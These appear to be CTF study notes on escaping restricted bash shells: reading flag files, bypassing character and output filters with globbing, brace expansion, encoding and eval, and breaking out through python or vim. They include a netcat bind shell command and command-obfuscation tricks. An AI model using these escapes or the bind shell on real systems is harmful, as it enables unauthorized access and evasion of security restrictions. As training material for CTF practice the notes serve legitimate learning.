## General Tips
- You can use `>$(<flag.txt)` to create a file with the name of the flag and try to leak file names
- You can use `echo *` to see all files in a directory, you can use `echo */*` to see recursively. Similarly you can use `cat` to output the files, or any other command.
- If there are multiple challenges on the same machine, you can try to store data as a file in a temporary directory, and then read the file in another challenge.
- You can try to use `scp` to move a bash script or binary there, that I can run more easily.
- You can chain commands with `|` (pass stdout of before to stdin of after) or with `;` (just run 2 separate commands).
- You can create a shell script with execute permissions on some unrestricted shell, with name that fits the limits (short / uppercase/  digits / whatever), and then you just need to run it.
## Seeing available commands
You can filter the outputs for badchars with `grep` or something.
- `compgen -c` - all executables in path, builtins, aliases, functions and keywords
- `compgen -b` - all builtins
- `ls ${PATH//:/}` - all files in PATH
- `ls /bin` 
## Directory Traversal
- `cd path`
- `cd ..` - up one level
- `pushd` - equivalent to `cd` in terms of moving of a directory, also pushes to the directory stack
- `popd` - removes the top of the directory stack and moves to the new top
- `dirs` - view the directory stack
- If `autocd` is enabled and the shell is interactive, typing a directory path will `cd` to it (untested). can enable using `shopt -s autocd`
## Creating Web Server
Can allow to bypass a limitation of no output or certain character limits.
### Possible servers
- `nc -nvlp 8001 -e /bin/bash` - remote terminal
- `python -m http.server 8001` - access to files in the current directory using HTTP (`http://localhost:8001/` will list all the current directory). This is in python3, in python2 replace `http.server` with `SimpleHTTPServer`.
### Server Access
- You can try to access it directly using the url of the machine and the port specified from your computer, but it might be blocked.
- If the server has another challenge in it, you can try to use the other challenge to send a request to localhost, and access it from there.
- You can map the remote port to local port through ssh, using `ssh -L localport:localhost:hostport user@address -p port` on my machine, then access the local port using ssh.
## Transferring data between shells on the server
In case there are multiple challenges in the machine and you can get a shell with better access
- web server and localhost
- File saved in user directory, `/tmp` or `/run/shm`
- `logger <text>`, and viewing system logs
- `wall <text>`, and the message might be visible in the other shell.
- You can pass the text as an argument for a command that takes a while (like `vi`) , and quickly see it using `ps axf` on another shell.
## Outputting a file
- `cat flag.txt`
- `echo $(<flag.txt)`
- `tail flag.txt` (last 10 lines)
- `uniq flag.txt`
- `grep '^' flag.txt`
- `awk {print} flag.txt`
- `cut -c1- flag.txt`
- `strings flag.txt`
- `nl flag.txt` 
- `source flag.txt` - attempt to run the flag as bash, the error might include the text
- `. flag.txt` - equivalent to `source`
- `more flag.txt`
- `less flag.txt`
## Getting a normal shell
Works if the limitations are in the shell and not a wrapper.
- `bash`
- `sh`
- `$0`
- `python`, then type: `import os; os.system("/bin/bash")`
## Running code that's the output of a command
- ``eval `cmd` `` - see [[#Running commands from arguments]]
- `smth | python -`
- `$($(cmd))`
- TODO nested backticks
### Running commands from arguments
- `eval cmd`
- `perl -e cmd`
- `find -exec cmd \;`
- `bash -c cmd`
## Output Redirection Bypass
- If a shell doesn't output result (redirects stdout) you can to output to stderr by running it as a command that will trigger an error, for example ``eval `cat flag.txt` ``, or doing `bash "flag.txt"`
- If stdout isn't outputted you can also try redirecting the output of the command to stderr: `cat flag.txt 1>&2`
- You can try writing to `/dev/tty` to see a result, as `/dev/tty` is the active terminal session and anything written there will be visible in the terminal. For example `cp flag.txt /dev/tty` or `cat flag.txt > /dev/tty`
- You can also use `$(tty)` or `$SSH_TTY`.
- You can redirect output to stdin with `>&0`, which might still be displayed even if stdout and stderr are overridden.
- You can try to override shell redirections in execution by finding the process id of the outer shell and accessing `/proc/<id>/fd/1`
- You can combine redirections to stdin or stderr with an interactive shell you spawn to bypass further limitations (like `bash >&0`)
- You can use the `tee` command to redirect to multiple outputs
## Bypassing Character Limitations
- You can replace chars in file name with `?` to bypass limited characters. Note that there might be multiple matches.
- You can try to use ranges like `[a-e]` to further limit matches.
- You can also save an expansion to a variable using `_0=(/bin/?ash)`, and access a specific match using `${_0[0]}`
- You can replace `cmd` with `/bin/cmd`, and use wildcards in the path.
- You can use escape sequences inside a string using this: `$'\x61'`. This even works with command names. Some more options, details in https://www.gnu.org/software/bash/manual/bash.html#ANSI_002dC-Quoting.
- You can replace space with any whitespace, including tabs and blank lines, or ${IFS}.
- You can run  encoded text using [[#Running code that's the output of a command]]
- You can convert text to lowercase using `tr '[:upper:]' '[:lower:]'`.
- You can replace letters with parameters with brace expansion range like `{a..e}` when in parameter, and if the command accepts multiple parameters that are processed separately at least one match is needed. You can also do something like `{a..e..2}` to reduce the expansions.
- Brace Expansion also be used inside eval by separating commands with `;`, like this: `eval e{a..e}ho\ {a..e}rg1\ {a..e}rg2\;`. The space and backslash needs to be escaped so they won't be processed directly as separator but only inside the `eval`.
- You can try navigating to a directory to run binaries in it to bypass `/` limitation, for example navigating to `/bin`.
- If `globstar` is enabled (can be enabled with `shopt -s globstar`), `**` is like `*` but also goes to subdirectories recursively
- If `sourcepath` is enabled, `source` can use all values in `$PATH`
- `!#` is replaced with previous command in interactive shells. can be used to bypass certain limitations / bypass comment.
### Text Encoding
- `echo encoded | base64 -d`. encode: `echo text | base64`
- `echo encoded | xxd -p -r`. encode: `echo text | xxd -p`
- `printf "smth"` allows encoding (see manpage, `\oct` is probably the most flexible).

### Getting environment variables
`ssh` by default sends `LANG` and `LC_*` (`*` can be replaced by anything) environment variables to the server, which means you can put anything in them and access them in the server using `$LC_smth` or `printenv LC_smth` (or `env` for all environment variables).
- `env` - gets all environment variables.
- You can then filter a specific environment variable using substring search
- You can evaluate the entire output of `env` after setting an environment variable to `| cmd #` to ignore all the other values.
- `printenv name`
- `$name`
- `jq -n env.name` - will return the value quoted
- `declare -p` - all environment variables
### Substring searching
- `grep "pattern" file` or `cmd | grep "pattern"` - will return the pattern and then the rest of the line
- `cmd | awk "/^pattern/"` - will return the pattern and then the rest of the line
### No Letters (PicoCTF SansAlpha)
In case some letters are banned, you can get those from file name by using wildcards ([[Bash Shell Expansions#Filename Expansion]]), you can try `(/???/????)` for example for an array with lots of commands with 4 letters, and access lots of letters.
Save the result as a variable, for example `_0=(/???/????)` will make `$_0` be equal to an array will lots of commands, and therefore lots of available letters. the first one is /bin/arch. Make sure to use parenthesis so it will be an array and it'll undergo expansion.
then you can use [[Bash Shell Expansions#Substring Expansion]] To get a specific letter, for example
`${_0:7:1}` will be c.
Then you can build any command and string you want.
You can also try echoing ./* to get all files in current directory, or just ./* to get one file. You can try different amount of ? to get one file from every length.
## Vim
### Opening
- In case `vi` automatically exists try `trap "vi" EXIT`.
- The `vi` interface might not be visible, you can still read and write to files using `:r path` and `:w path`, and run commands normally.
### Using
Press escape to get to command mode
- Change shell using `:set shell=/bin/bash`
- Type `:shell` to get shell
- Type `:!cmd` to execute `cmd`
- Read from file using `:r path`
- Write to file using `:w path`
## Troubleshooting
- Shell evaluation order might cause problems, use `eval` before the command to force full re-evaluation. For example, in case a command is executed using `$variable` redirection is determined before expanding `$variable`. To fix use `eval cat < flag.txt`.
- The `read` command already performs some escaping, so a backslash needs to be inserted as double backslash.
- In backtick command substitution, unlike `$()`, backticks are parsed on the first step, so if you want to have a backslash in a command you need to replace it with `\\`
- `eval` also drops backslashes, so if you want `eval` to still preserve a literal backslash you need to replace it with `\\`